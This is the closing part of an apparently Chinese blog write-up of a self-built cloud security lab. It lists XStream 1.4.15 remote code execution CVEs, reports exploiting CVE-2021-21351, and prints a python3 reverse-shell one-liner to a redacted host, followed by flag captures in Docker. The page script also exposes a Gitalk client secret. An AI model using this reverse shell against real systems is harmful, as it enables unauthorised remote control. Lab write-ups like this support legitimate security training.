<figure data-type="image" tabindex="77"><img src="https://p.ipic.vip/ng0h1q.png" alt="img" loading="lazy"></figure>
<p>再搜索下xstream 1.4.15 存在哪些漏洞，获取的信息如下：</p>
<figure data-type="image" tabindex="78"><img src="https://p.ipic.vip/97n5nk.png" alt="img" loading="lazy"></figure>
<p>符合版本的漏洞如下：</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21344.html">CVE-2021-21344</a> | <code>XStream</code>: &lt;= 1.4.15 |</p>
<p>| ------------------------ | ------------------------------------------------------------ | -------------------- |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21345.html">CVE-2021-21345</a> | <code>XStream</code>: &lt;= 1.4.15 |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21346.html">CVE-2021-21346</a> | <code>XStream</code>: &lt;= 1.4.15 |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21347.html">CVE-2021-21347</a> | <code>XStream</code>&lt;= 1.4.15   |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21350.html">CVE-2021-21350</a> | <code>XStream</code>: &lt;= 1.4.15 |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-21351.html">CVE-2021-21351</a> | <code>XStream</code>: &lt;= 1.4.15 |</p>
<p>| XStream 远程代码执行漏洞 | <a href="https://x-stream.github.io/CVE-2021-29505.html">CVE-2021-29505</a> | <code>XStream</code>: &lt;= 1.4.16 |</p>
<p>我们尝试了几个，发现CVE-2021-21351 可以利用, 打JNDI 利用链使用spring依赖的</p>
<figure data-type="image" tabindex="79"><img src="https://p.ipic.vip/wborub.png" alt="img" loading="lazy"></figure>
<p>通过python3来反弹shell：</p>
<pre><code class="language-python">python3 -c 'import os,pty,socket;s=socket.socket();s.connect((&quot;xxxxxx&quot;,9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)'

</code></pre>
<p>反弹成功，获取第二个flag</p>
<figure data-type="image" tabindex="80"><img src="https://p.ipic.vip/he4ruq.png" alt="img" loading="lazy"></figure>
<p>信息收集 本机docker有Flag3：</p>
<figure data-type="image" tabindex="81"><img src="https://p.ipic.vip/7l3usc.png" alt="img" loading="lazy"></figure>
<p>进入docker获取flag3:</p>
<figure data-type="image" tabindex="82"><img src="https://p.ipic.vip/v273bu.png" alt="img" loading="lazy"></figure>

                        </div>
                        
                                
                                                    
                                                                    <!--Share-->
                                                                    <span style="margin-right:15px">
                        <i class="post-share"></i>
                        <span>&#x5206;&#x4EAB;:</span>
                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/2EzGQuE0b/"><i class="fa fa-qrcode"></i></a>
                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/2EzGQuE0b/&sharesource=qzone&title=云安全: 云安全自建靶场答题记录&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/2EzGQuE0b/&sharesource=weibo&title=云安全: 云安全自建靶场答题记录 + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>

                                                                    </span>
                                                                    
                                                                            <!--zh-->
                                                                            <section class="post-tags zh ">
                                                                                <div>
                                                                                    <span>&#x6807;&#x7B7E;:</span>
                                                                                    <span class="tag ">
                        
                        
                        <a href="https://1oecho.github.io/r2rd6ViBp/">#
                    云安全
                        </a>
                        
                            
                                </span>
                                                                                </div>
                                                                                <div>
                                                                                    <a href="javascript:window.history.back();">
                        &#x8FD4;&#x56DE;</a>
                                                                                    <span>&dot;</span>
                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
                                                                                </div>
                                                                            </section>

                                                                            
                                                                                <!---->
                                                                                <section class="post-nav">
                                                                                    
                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/oYmYrVh51/">
                                                                                            漏洞利用：某某锁代码执行漏洞实战注入内存马
                                                                                        </a>
                                                                                        
                                                                                            
                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/behinder3-beta11-shi-zhan-xia-de-er-ci-kai-fa/">
                                                                                                    红队开发: Behinder3-Beta11 实战下的二次开发 （4）
                                                                                                </a>
                                                                                                
                                                                                </section>
                    </article>
                </div>
                
                    
                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>

<script>
    var gitalk = new Gitalk({
        clientID: '61442cf87c4266a18189',
        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
        repo: 'loecho',
        owner: '1oecho',
        admin: ['1oecho'],
        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
        distractionFreeMode: false // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script>
                            
                                        
                                            
            </div>
    </div>
    </div>
    </div>
    
        <footer id="footer" class="footer">
            <div class="copyright">
                
                        loecho-sec
                            
                                <b id="hitokoto"></b><br>
                                
                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
            <path
                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
                fill="#93b5cf"></path>
        </svg>
                                         &copy;Copyright
                                            <script>
                                                var date = new Date();
                                                document.write("" + date.getFullYear());
                                            </script>
                                            | Powered by
                                            <a href="https://1oecho.github.io/" target="_blank">
                                                loecho-sec
                                            </a>
            </div>
            <div id="update" style="display:none;">
                on
            </div>
            
                <div id="version" style="display:none;">
                    1.7.5
                </div>
                
                    <script>
                        var pat = '';
                        
                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
                    </script>
        </footer>
        
            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
            
                <script>
                    
                    
                    loadlive2d();
                    
                    
                    hitokoto();
                    
                    getStar();
                    hljs.initHighlighting();
                    console.clear();
                    
                    CheckVersion();
                    
                    var newDate = new Date();
                    newDate.setTime(1702539383157);
                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                </script>
                
        </div>
</body>
<script>
    scroll();
</script>

</html>